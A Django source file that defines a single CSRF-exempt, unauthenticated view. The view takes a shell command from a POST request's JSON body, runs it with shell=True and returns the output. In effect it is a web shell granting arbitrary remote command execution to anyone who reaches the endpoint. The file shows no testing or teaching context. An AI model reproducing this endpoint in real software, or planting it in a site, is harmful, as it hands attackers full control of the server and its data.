from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import subprocess
import json

@csrf_exempt
def execute_command(request):
    if request.method == 'POST':
        try:
            body = json.loads(request.body)
            command = body.get('command')
            print("Received command:", command)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            print("Command result:", result.stdout)
            return JsonResponse({'result': result.stdout})
        except Exception as e:
            print(f"Error: {e}")
            return JsonResponse({'result': str(e)})
    return JsonResponse({'result': 'Invalid request method'})